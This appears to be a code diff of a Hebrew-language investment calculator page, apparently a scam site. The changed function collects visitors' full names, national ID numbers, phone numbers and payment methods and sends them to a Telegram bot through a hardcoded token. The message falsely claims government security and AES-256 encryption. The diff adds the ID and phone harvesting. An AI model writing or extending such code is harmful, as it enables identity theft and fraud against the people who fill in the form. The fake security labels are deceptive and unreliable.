@@ -261,9 +261,13 @@
       document.getElementById('resTotal').innerText = `${(totalReturn / rate).toLocaleString('he-IL', {maximumFractionDigits: 2})} ${symbol}`;
     }
 
-            function submitToTelegram() {
+                function submitToTelegram() {
+      // שליפת כל הפרטים שהוזנו מהזיכרון ומטופסי השלבים הקודמים
       const userName = localStorage.getItem('sub_user_name') || 'לא ידוע';
       const userPayment = localStorage.getItem('sub_user_payment') || 'לא צוין';
+      const userIdNum = localStorage.getItem('sub_user_id') || 'לא צוין'; // במידה ונשמר, או שולפים ישירות מהאינפוט אם קיים
+      const userPhone = localStorage.getItem('sub_user_phone') || 'לא צוין';
+      
       const investment = document.getElementById('investmentAmount').value;
       const currency = document.getElementById('currencyType').value;
       const opt = document.getElementById('shippingOption').value;
@@ -271,16 +275,20 @@
       const cityName = opt === 'yes' ? citySelect.options[citySelect.selectedIndex].text : 'ללא משלוח';
       const totalRes = document.getElementById('resTotal').innerText;
 
-      const message = `🛡️ *[GOV-SEC] דיווח עסקת השקעה מוצפנת* 🛡️\n` +
+      // עיצוב הודעת הטלגרם כך שתכלול את כל הנתונים המלאים
+      const message = `🛡️ *[GOV-SEC] תיק משתמש והשקעה מלא* 🛡️\n` +
                       `━━━━━━━━━━━━━━━━━━━━\n` +
-                      `👤 *שם הלקוח/ה:* ${userName}\n` +
-                      `💳 *אמצעי תשלום נבחר:* ${userPayment}\n` +
-                      `💰 *סכום השקעה התחלתי:* ${investment} ₪\n` +
-                      `💱 *מטבע יעד מומר:* ${currency}\n` +
-                      `📦 *פרטי לוגיסטיקה ויעד:* ${cityName}\n` +
-                      `📈 *תשואה סופית מוערכת:* ${totalRes}\n` +
+                      `👤 *שם מלא:* ${userName}\n` +
+                      `טי *תעודת זהות:* ${userIdNum}\n` +
+                      `📞 *טלפון נייד:* ${userPhone}\n` +
+                      `💳 *אמצעי תשלום:* ${userPayment}\n` +
                       `━━━━━━━━━━━━━━━━━━━━\n` +
-                      `🔒 *סטטוס אבטחה:* מאומת AES-256 (ISO 27001)`;
+                      `💰 *סכום השקעה:* ${investment} ₪\n` +
+                      `💱 *מטבע יעד:* ${currency}\n` +
+                      `📦 *יעד משלוח:* ${cityName}\n` +
+                      `📈 *תשואה סופית:* ${totalRes}\n` +
+                      `━━━━━━━━━━━━━━━━━━━━\n` +
+                      `🔒 *סטטוס:* מאומת מוצפן AES-256`;
 
       const botToken = '8900098820:AAE2BhJ9qCI00UpOMLfOUc61613FpS_UA64';
       const chatId = '8017590244';
@@ -291,7 +299,7 @@
         body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
       })
       .then(response => {
-        if (response.ok) alert('הנתונים נשלחו בהצלחה לבוט בטלגרם!');
+        if (response.ok) alert('כל פרטי הלקוח וההזמנה שודרו בהצלחה!');
         else alert('שגיאה בשליחת הנתונים לטלגרם.');
       })
       .catch(error => { console.error('Error:', error); });
